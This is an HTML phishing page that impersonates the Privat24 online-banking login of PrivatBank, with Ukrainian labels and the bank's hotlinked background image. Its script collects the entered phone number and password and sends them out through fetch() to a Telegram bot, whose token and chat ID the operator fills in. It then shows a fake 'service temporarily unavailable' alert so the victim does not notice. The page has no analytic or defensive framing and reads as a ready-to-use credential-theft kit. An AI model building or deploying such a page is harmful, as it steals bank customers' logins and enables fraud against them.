<style>
  body {
    background: url('https://privatbank.ua/themes/privatbank/assets/img/bg-main.jpg') no-repeat center center fixed;
    background-size: cover;
    font-family: sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .login-box {
    background: rgba(255, 255, 255, 0.9);
    padding: 30px;
    border-radius: 8px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    width: 320px;
    text-align: center;
  }
  input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
  }
  button {
    width: 100%;
    padding: 12px;
    background-color: #7ab500;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    cursor: pointer;
  }
</style>

</head>
<body>
  <div class="login-box">
    <div style="font-size: 24px; font-weight: bold; color: #7ab500; margin-bottom: 20px;">
      Privat<span style="color: #333;">24</span>
    </div>
    <input type="text" id="log" placeholder="Номер телефону">
    <input type="password" id="pas" placeholder="Пароль">
    <button onclick="send()">Увійти</button>
  </div>

  <script>
    function send() {
      const token = '8790499217:AAFZF80...'; // Твій токен
      const chat = 'ТВІЙ_ID'; 
      const text = 'Логін: ' + document.getElementById('log').value + ' Пароль: ' + document.getElementById('pas').value;
      fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + text);
      alert('Сервіс тимчасово недоступний');
    }
  </script>
</body>
</html>
